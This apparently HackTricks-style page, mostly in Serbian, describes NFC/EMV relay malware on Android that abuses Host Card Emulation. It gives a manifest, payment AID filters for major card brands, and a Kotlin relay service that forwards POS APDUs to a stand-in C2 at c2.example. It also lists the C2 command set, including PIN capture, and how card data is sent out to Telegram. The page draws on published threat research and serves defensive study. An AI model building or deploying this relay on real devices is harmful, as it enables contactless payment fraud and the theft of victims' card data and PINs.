# Android HCE NFC/EMV Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Zloupotreba Android Host Card Emulation (HCE) omogućava zlonamernoj aplikaciji koja je podešena kao podrazumevana NFC payment service da u realnom vremenu prosleđuje EMV kontaktless transakcije. POS terminal komunicira ISO 14443-4/EMV sa telefonom; aplikacija HostApduService prima APDU-e i prosleđuje ih preko dvosmernog C2 (često WebSocket) ka backendu koji sastavlja odgovore, koji se zatim prosleđuju nazad ka POS-u. Ovo omogućava emulaciju kartice uživo bez lokalnih podataka o kartici. Kampanje viđene u velikom obimu rebrendiraju se kao aplikacije banaka/državnih organa, zahtevaju da postanu podrazumevana payment aplikacija i auto-exfiltrate podatke uređaja/kartice na Telegram botove/kanale.

Ključne karakteristike
- Android komponente: HostApduService + podrazumevani NFC payment handler (category "payment")
- Transport/C2: WebSocket za APDU relay; Telegram bot API za exfil/ops
- Radni tok operatora: strukturisane komande (login, register_device, apdu_command/apdu_response, get_pin/pin_response, paired, check_status, update_required, telegram_notification, error)
- Uloge: scanner (read EMV data) vs tapper (HCE/relay) builds

## Minimalne komponente implementacije

### Manifest (postati podrazumevana payment HCE service)
```xml
<uses-feature android:name="android.hardware.nfc.hce" android:required="true"/>
<uses-permission android:name="android.permission.NFC"/>

<application ...>
<service
android:name=".EmvRelayService"
android:exported="true"
android:permission="android.permission.BIND_NFC_SERVICE">
<intent-filter>
<action android:name="android.nfc.cardemulation.action.HOST_APDU_SERVICE"/>
</intent-filter>
<meta-data
android:name="android.nfc.cardemulation.host_apdu_service"
android:resource="@xml/aid_list"/>
</service>
</application>
```
Primer liste AID-ova sa EMV payment kategorijom (samo aplikacije podešene kao podrazumevane za plaćanje mogu odgovoriti na ove AID-ove):
```xml
<?xml version="1.0" encoding="utf-8"?>
<host-apdu-service xmlns:android="http://schemas.android.com/apk/res/android"
android:description="@string/app_name"
android:requireDeviceUnlock="false">
<aid-group android:category="payment" android:description="@string/app_name">
<!-- PPSE (2PAY.SYS.DDF01) routing -->
<aid-filter android:name="325041592E5359532E4444463031"/>
<!-- Common EMV AIDs (examples): -->
<aid-filter android:name="A0000000031010"/> <!-- VISA credit/debit -->
<aid-filter android:name="A0000000041010"/> <!-- MasterCard -->
<aid-filter android:name="A00000002501"/>   <!-- AmEx -->
</aid-group>
</host-apdu-service>
```
Zatraži od korisnika da postavi podrazumevanu aplikaciju za plaćanje (otvara podešavanja OS-a):
```kotlin
val intent = Intent("android.settings.NFC_PAYMENT_SETTINGS")
startActivity(intent)
```
### Kostur relay-a za HostApduService
```kotlin
class EmvRelayService : HostApduService() {
private var ws: okhttp3.WebSocket? = null

override fun onCreate() {
super.onCreate()
// Establish C2 WebSocket early; authenticate and register device
val client = okhttp3.OkHttpClient()
val req = okhttp3.Request.Builder().url("wss://c2.example/ws").build()
ws = client.newWebSocket(req, object : okhttp3.WebSocketListener() {})
}

override fun processCommandApdu(commandApdu: ByteArray?, extras: Bundle?): ByteArray {
// Marshal APDU to C2 and block until response
val id = System.nanoTime()
val msg = mapOf(
"type" to "apdu_command",
"id" to id,
"data" to commandApdu!!.toHex()
)
val response = sendAndAwait(msg) // wait for matching apdu_response{id}
return response.hexToBytes()
}

override fun onDeactivated(reason: Int) {
ws?.send("{\"type\":\"card_removed\"}")
}

private fun sendAndAwait(m: Any): String {
// Implement correlation + timeout; handle error/blocked status
// ...
return "9000" // fall back to SW success if needed
}
}
```
Korisna napomena: Pozadinska usluga mora da odgovori u okviru POS vremenskog ograničenja (~nekoliko stotina ms) po APDU; održavajte low-latency socket i pre-auth sa C2. Održati rad nakon gašenja procesa koristeći foreground service po potrebi.

### Tipičan skup C2 komandi (posmatrano)
```text
login / login_response
register / register_device / register_response
logout
apdu_command / apdu_response
card_info / clear_card_info / card_removed
get_pin / pin_response
check_status / status_response
paired / unpaired
update_required
telegram_notification / telegram_response
error
```
### EMV bezkontaktna razmena (primer)

The POS drives the flow; the HCE app simply relays APDUs:

- SELECT PPSE (2PAY.SYS.DDF01)
- 00 A4 04 00 0E 32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00
- SELECT application AID (e.g., VISA  A0000000031010)
- 00 A4 04 00 len <AID> 00
- GET PROCESSING OPTIONS (GPO)
- 80 A8 00 00 Lc <PDOL data> 00
- READ RECORD(S) per AFL
- 00 B2 <SFI/record> 0C 00
- GENERATE AC (ARQC/TC)
- 80 AE 80 00 Lc <CDOL1 data> 00

U relay-u, backend kreira validan FCI/FCP, AFL, records i kriptogram; telefon samo prosleđuje bajtove.

## Radni tokovi operatora viđeni u stvarnom svetu

- Deception + install: app re-skins as bank/gov portal, presents full-screen WebView and immediately requests to become default NFC payment app.
- Event-triggered activation: NFC tap wakes HostApduService; the relay begins.
- Scanner/Tapper roles: one build reads EMV data from a victim card (PAN, exp, tracks, device/EMV fields) and exfiltrates; another build (or the same device later) performs HCE relay to a POS.
- Exfiltration: device/card data is auto-posted to private Telegram channels/bots; WebSocket coordinates sessions and UI prompts (e.g., on-device PIN UI).

## References

- [Zimperium – Tap-and-Steal: The Rise of NFC Relay Malware on Mobile Devices](https://zimperium.com/blog/tap-and-steal-the-rise-of-nfc-relay-malware-on-mobile-devices)
- [Android HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService)
- [Android HCE and Card Emulation docs](https://developer.android.com/guide/topics/connectivity/nfc/hce)
- [Zimperium IOCs – 2025-10-NFCStealer](https://github.com/Zimperium/IOC/tree/master/2025-10-NFCStealer)

{{#include ../../banners/hacktricks-training.md}}
